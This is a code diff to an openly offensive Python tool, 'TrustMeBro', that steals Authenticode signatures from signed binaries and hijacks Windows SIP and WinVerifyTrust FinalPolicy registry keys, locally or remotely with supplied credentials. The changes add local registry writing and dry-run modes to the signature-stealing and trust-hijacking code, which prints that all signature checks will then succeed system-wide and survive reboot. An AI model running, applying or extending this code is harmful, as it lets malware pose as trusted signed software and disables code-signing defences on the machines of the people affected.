@@ -274,6 +274,45 @@ def delete_reg_key(reg_tool, target, key):
         print(f"[-] Execution failed: {e}")
         return False
 
+def local_reg_set(key, value, data):
+    """Write a registry value on the local Windows machine via winreg."""
+    try:
+        import winreg
+    except ImportError:
+        print("[-] winreg not available. --local requires Windows.")
+        return False
+    # key format: HKLM\SOFTWARE\...
+    parts = key.split("\\", 1)
+    root_map = {"HKLM": winreg.HKEY_LOCAL_MACHINE, "HKCU": winreg.HKEY_CURRENT_USER}
+    root = root_map.get(parts[0])
+    if not root or len(parts) < 2:
+        print(f"[-] Invalid key: {key}")
+        return False
+    subkey = parts[1]
+    try:
+        hkey = winreg.CreateKeyEx(root, subkey, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(hkey, value, 0, winreg.REG_SZ, data)
+        winreg.CloseKey(hkey)
+        if g_verbose:
+            print(f"[+] Set {key}\\{value} = {data}")
+        return True
+    except OSError as e:
+        print(f"[-] RegSetValueEx failed on {key}\\{value}: {e}")
+        return False
+
+# Verbose flag for local mode
+g_verbose = False
+
+def write_reg(args, key, value, data, dry_run=False):
+    """Unified registry write: local or remote based on args."""
+    if dry_run:
+        print(f"[dry-run] Would set {key}\\{value} = {data}")
+        return True
+    if getattr(args, 'local', False):
+        return local_reg_set(key, value, data)
+    else:
+        return run_reg_cmd(args._reg_tool, args._target_str, key, value, data)
+
 def normalize_provider_guid(provider_guid):
     provider_guid = provider_guid.strip()
     if not provider_guid.startswith("{"):
@@ -745,25 +784,28 @@ def main():
     parser = argparse.ArgumentParser(description="TrustMeBro - Unified Signature Tool (Steal & Hijack)")
     subparsers = parser.add_subparsers(dest="command", help="Command to run")
 
-    # Subcommand: steal
+    # Subcommand: steal (file operations only, no registry)
     steal_parser = subparsers.add_parser("steal", help="Steal signature from source and apply to target")
     steal_parser.add_argument("-s", "--source", required=True, help="Signed source binary")
     steal_parser.add_argument("-t", "--target", required=True, help="Target binary to sign")
     steal_parser.add_argument("-o", "--output", help="Output file path (default: target_signed.exe)")
     steal_parser.add_argument("--clone", action="store_true", help="Clone metadata (resources) from source to target")
+    steal_parser.add_argument("--dry-run", action="store_true", help="Print what would happen without writing")
 
-    # Subcommand: hijack
-    hijack_parser = subparsers.add_parser("hijack", help="Perform Remote Registry Hijack (SIP Attack)")
-    hijack_parser.add_argument("target_ip", help="Target IP/Hostname (e.g., 192.168.1.10)")
-    hijack_parser.add_argument("-u", "--user", required=True, help="Username (DOMAIN/User or User)")
-    hijack_parser.add_argument("-p", "--password", required=True, help="Password")
+    # Subcommand: hijack (remote by default, --local for local machine)
+    hijack_parser = subparsers.add_parser("hijack", help="Install SIP or FinalPolicy persistence")
+    hijack_parser.add_argument("target_ip", nargs="?", default=None, help="Target IP/Hostname (required unless --local)")
+    hijack_parser.add_argument("-u", "--user", help="Username (DOMAIN/User or User)")
+    hijack_parser.add_argument("-p", "--password", help="Password")
+    hijack_parser.add_argument("--local", action="store_true", help="Run on local machine (no IP/creds needed, uses winreg)")
     hijack_parser.add_argument("--action", choices=["hijack", "clean", "finalpolicy", "finalpolicy-clean", "custom-provider", "custom-provider-clean"], default="hijack", help="Action to perform")
-    hijack_parser.add_argument("--provider-guid", help="Provider GUID for custom-provider/custom-provider-clean (default: random GUID for custom-provider)")
-    hijack_parser.add_argument("--tool", help="Path to reg.py if not in PATH")
-    hijack_parser.add_argument("--wow64-only", action="store_true", help="Write only to WOW6432Node (hijacks 32-bit callers, 64-bit registry stays clean)")
-    hijack_parser.add_argument("--sac", action="store_true", help="Include Smart App Control SIP (Win11 only, GUID 18B3C141)")
-    hijack_parser.add_argument("--all-sips", action="store_true", help="Include all 19 SIP GUIDs (standard + SAC + Win11-only)")
-    hijack_parser.add_argument("--sip-types", help=f"Comma-separated SIP types to target (default: PE,PowerShell,MSI). Use 'all' for all 17 standard SIPs. Available: {','.join(sorted(SIPS.keys()))}")
+    hijack_parser.add_argument("--provider-guid", help="Provider GUID for custom-provider/custom-provider-clean (default: random)")
+    hijack_parser.add_argument("--tool", help="Path to reg.py if not in PATH (remote mode only)")
+    hijack_parser.add_argument("--wow64-only", action="store_true", help="Write only to WOW6432Node (32-bit callers)")
+    hijack_parser.add_argument("--sac", action="store_true", help="Include Smart App Control SIP (Win11)")
+    hijack_parser.add_argument("--all-sips", action="store_true", help="Include all 19 SIP GUIDs")
+    hijack_parser.add_argument("--sip-types", help=f"Comma-separated SIP types (default: PE,PowerShell,MSI). Use 'all' for all 17. Available: {','.join(sorted(SIPS.keys()))}")
+    hijack_parser.add_argument("--dry-run", action="store_true", help="Print what would happen without writing")
 
     # Subcommand: embed
     embed_parser = subparsers.add_parser("embed", help="Embed payload in PKCS#7 unauthenticated attributes (signature stays valid)")
@@ -792,152 +834,141 @@ def main():
     args = parser.parse_args()
 
     if args.command == "steal":
+        if getattr(args, 'dry_run', False):
+            print(f"[dry-run] Would steal signature from {args.source} to {args.target}")
+            if args.clone:
+                print("[dry-run] Would clone metadata")
+            sys.exit(0)
+
         output_file = args.output if args.output else args.target + "_signed.exe"
-        
-        # Create a working copy of the target so we don't modify the original input
         shutil.copy2(args.target, output_file)
         
         if args.clone:
             if not clone_metadata(args.source, output_file):
-                print("[-] Warning: Metadata cloning failed. Proceeding with signature stealing only.")
+                print("[-] Metadata cloning failed. Continuing with signature steal.")
 
         print(f"[*] Stealing signature from {args.source}...")
         cert = copy_cert(args.source)
         if cert:
             print(f"[+] Signature extracted ({len(cert)} bytes).")
-            # We pass output_file as both target and output because we already copied/modified it
             if write_cert(cert, output_file, output_file):
-                print(f"[+] Signature applied successfully to {output_file}")
+                print(f"[+] Signature stolen to {output_file}")
+                print("[*] Signature will not validate without SIP hijack or FinalPolicy.")
+                print("[*] Run: TrustMeBro.py hijack ... --action hijack  to make it validate.")
             else:
                 print("[-] Failed to write signature.")
         else:
             print("[-] Failed to extract signature.")
 
     elif args.command == "hijack":
-        # Construct target string for impacket: domain/user:password@ip
-        # Handle domain
-        if "/" in args.user:
-            domain, user = args.user.split("/", 1)
+        dry_run = getattr(args, 'dry_run', False)
+
+        # Resolve execution mode: --local or remote
+        if getattr(args, 'local', False):
+            global g_verbose
+            g_verbose = False
+            args._reg_tool = None
+            args._target_str = None
+            print("[*] Local mode: writing to local registry.")
         else:
-            domain = ""
-            user = args.user
-            
-        target_str = f"{domain}/{user}:{args.password}@{args.target_ip}"
-        
-        # Locate reg.py
-        reg_tool = args.tool
-        if not reg_tool:
-            reg_tool = find_reg_tool()
-        
-        if not reg_tool:
-            print("[-] Error: Could not find 'reg.py' or 'impacket-reg' in PATH.")
-            print("    Please install Impacket or specify the path with --tool")
-            sys.exit(1)
-            
-        print(f"[*] Using registry tool: {reg_tool}")
-        
-        print(f"[*] Starting {args.action.upper()} operation on {args.target_ip}...")
+            # Remote mode: require target_ip, user, password
+            if not args.target_ip:
+                print("[-] Remote mode requires a target IP. Use --local for local machine.")
+                print("    Example: TrustMeBro.py hijack 192.168.1.10 -u Admin -p Pass")
+                sys.exit(1)
+            if not args.user or not args.password:
+                print("[-] Remote mode requires -u/--user and -p/--password.")
+                sys.exit(1)
+
+            if "/" in args.user:
+                domain, user = args.user.split("/", 1)
+            else:
+                domain, user = "", args.user
+            args._target_str = f"{domain}/{user}:{args.password}@{args.target_ip}"
+
+            reg_tool = args.tool or find_reg_tool()
+            if not reg_tool:
+                print("[-] Could not find 'reg.py' or 'impacket-reg' in PATH.")
+                print("    Install Impacket or specify --tool path.")
+                sys.exit(1)
+            args._reg_tool = reg_tool
+            print(f"[*] Remote mode: {args.target_ip} via {reg_tool}")
+
+        print(f"[*] Action: {args.action.upper()}")
 
         if args.action == "finalpolicy":
-            success_count = 0
-            total_ops = len(FINALPOLICY_HIJACK)
             for val_name, val_data in FINALPOLICY_HIJACK.items():
-                if run_reg_cmd(reg_tool, target_str, FINALPOLICY_KEY, val_name, val_data):
-                    success_count += 1
-            print("-" * 50)
-            if success_count == total_ops:
-                print("[+] FinalPolicy hijacked. WinVerifyTrust now returns success for all files.")
-                print("[!] Stolen signatures will show verified publisher (Subject CN from cert).")
-                print("[!] This is system-wide. Affects all processes. Survives reboot.")
-            else:
-                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+                write_reg(args, FINALPOLICY_KEY, val_name, val_data, dry_run)
+            if not dry_run:
+                print("[+] FinalPolicy hijacked. All signature checks return success.")
+                print("[!] System-wide. Affects all processes. Survives reboot.")
+                print("Undo: TrustMeBro.py hijack ... --action finalpolicy-clean")
         elif args.action == "finalpolicy-clean":
-            success_count = 0
-            total_ops = len(FINALPOLICY_CLEAN)
             for val_name, val_data in FINALPOLICY_CLEAN.items():
-                if run_reg_cmd(reg_tool, target_str, FINALPOLICY_KEY, val_name, val_data):
-                    success_count += 1
-            print("-" * 50)
-            if success_count == total_ops:
-                print("[+] FinalPolicy restored to SoftpubAuthenticode (default).")
-            else:
-                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+                write_reg(args, FINALPOLICY_KEY, val_name, val_data, dry_run)
+            if not dry_run:
+                print("[+] FinalPolicy restored to SoftpubAuthenticode.")
         elif args.action == "custom-provider":
-            provider_guid = normalize_provider_guid(args.provider_guid) if args.provider_guid else "{" + str(uuid.uuid4()) + "}"
+            import uuid as _uuid
+            provider_guid = normalize_provider_guid(args.provider_guid) if args.provider_guid else "{" + str(_uuid.uuid4()).upper() + "}"
             provider_key = f"{FINALPOLICY_BASE_KEY}\\{provider_guid}"
-            success_count = 0
-            total_ops = len(FINALPOLICY_HIJACK)
             for val_name, val_data in FINALPOLICY_HIJACK.items():
-                if run_reg_cmd(reg_tool, target_str, provider_key, val_name, val_data):
-                    success_count += 1
-            print("-" * 50)
-            if success_count == total_ops:
+                write_reg(args, provider_key, val_name, val_data, dry_run)
+            if not dry_run:
                 print(f"[+] Custom trust provider registered: {provider_guid}")
-                print(f"[!] WinVerifyTrust callers must use this GUID: {provider_guid}")
-            else:
-                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+                print(f"Undo: TrustMeBro.py hijack ... --action custom-provider-clean --provider-guid {provider_guid}")
         elif args.action == "custom-provider-clean":
             if not args.provider_guid:
-                hijack_parser.error("--provider-guid is required for custom-provider-clean")
+                print("[-] --provider-guid is required for custom-provider-clean.")
+                sys.exit(1)
             provider_guid = normalize_provider_guid(args.provider_guid)
             provider_key = f"{FINALPOLICY_BASE_KEY}\\{provider_guid}"
-            print("-" * 50)
-            if delete_reg_key(reg_tool, target_str, provider_key):
-                print(f"[+] Custom trust provider removed: {provider_guid}")
-            else:
-                print(f"[-] Failed to remove custom trust provider: {provider_guid}")
+            for val_name, val_data in FINALPOLICY_CLEAN.items():
+                write_reg(args, provider_key, val_name, val_data, dry_run)
+            if not dry_run:
+                print(f"[+] Custom trust provider cleaned: {provider_guid}")
         else:
+            # hijack or clean: SIP registry
             config = HIJACK_CONFIG if args.action == "hijack" else CLEAN_CONFIG
-            # Build SIP set based on flags
+            # Resolve SIP set
             sip_types_arg = getattr(args, 'sip_types', None)
             if getattr(args, 'all_sips', False):
                 active_sips = dict(ALL_SIPS)
-                print(f"[*] All {len(active_sips)} SIP GUIDs targeted.")
             elif sip_types_arg:
                 if sip_types_arg.lower() == 'all':
                     active_sips = dict(SIPS)
-                    print(f"[*] All {len(active_sips)} standard SIP GUIDs targeted.")
                 else:
-                    requested = [t.strip() for t in sip_types_arg.split(',')]
                     active_sips = {}
-                    for t in requested:
-                        # Case-insensitive lookup
+                    for t in [x.strip() for x in sip_types_arg.split(',')]:
                         match = next((k for k in ALL_SIPS if k.lower() == t.lower()), None)
                         if match:
                             active_sips[match] = ALL_SIPS[match]
                         else:
                             print(f"[-] Unknown SIP type: {t}. Available: {','.join(sorted(ALL_SIPS.keys()))}")
                             sys.exit(1)
-                    print(f"[*] Targeting {len(active_sips)} SIP(s): {', '.join(active_sips.keys())}")
             else:
                 active_sips = {k: SIPS[k] for k in DEFAULT_SIP_TYPES}
-                print(f"[*] Default SIP targets: {', '.join(active_sips.keys())} (use --sip-types to change)")
             if getattr(args, 'sac', False) and 'SmartAppControl' not in active_sips:
                 active_sips.update(SAC_SIP)
-                print("[!] Smart App Control SIP included (Win11 only).")
-            # Build key list based on --wow64-only
-            keys = []
+            print(f"[*] Targeting {len(active_sips)} SIP(s): {', '.join(active_sips.keys())}")
+            if getattr(args, 'wow64_only', False):
+                print("[!] WOW64-only: 32-bit callers affected, 64-bit registry untouched.")
+
             for name, guid in active_sips.items():
                 if not getattr(args, 'wow64_only', False):
-                    keys.append(f"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")
-                keys.append(f"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}")
-            if getattr(args, 'wow64_only', False):
-                print("[!] WOW64-only mode: writing to WOW6432Node only. Affects 32-bit callers. 64-bit registry untouched.")
-            success_count = 0
-            total_ops = len(keys) * 2
-
-            for key in keys:
+                    key64 = f"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}"
+                    for val_name, val_data in config.items():
+                        write_reg(args, key64, val_name, val_data, dry_run)
+                key32 = f"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}"
                 for val_name, val_data in config.items():
-                    if run_reg_cmd(reg_tool, target_str, key, val_name, val_data):
-                        success_count += 1
+                    write_reg(args, key32, val_name, val_data, dry_run)
 
-            print("-" * 50)
-            if success_count == total_ops:
-                print(f"[+] Operation completed successfully ({success_count}/{total_ops} changes).")
+            if not dry_run:
                 if args.action == "hijack":
-                    print("[!] Target is now hijacked. Reboot or re-login may be required.")
-            else:
-                print(f"[-] Operation completed with errors ({success_count}/{total_ops} changes successful).")
+                    print(f"[+] SIP persistence installed for {len(active_sips)} type(s).")
+                    print("Undo: TrustMeBro.py hijack ... --action clean")
+                else:
+                    print(f"[+] SIP keys restored for {len(active_sips)} type(s).")
 
     elif args.command == "embed":
         _require_asn1crypto()
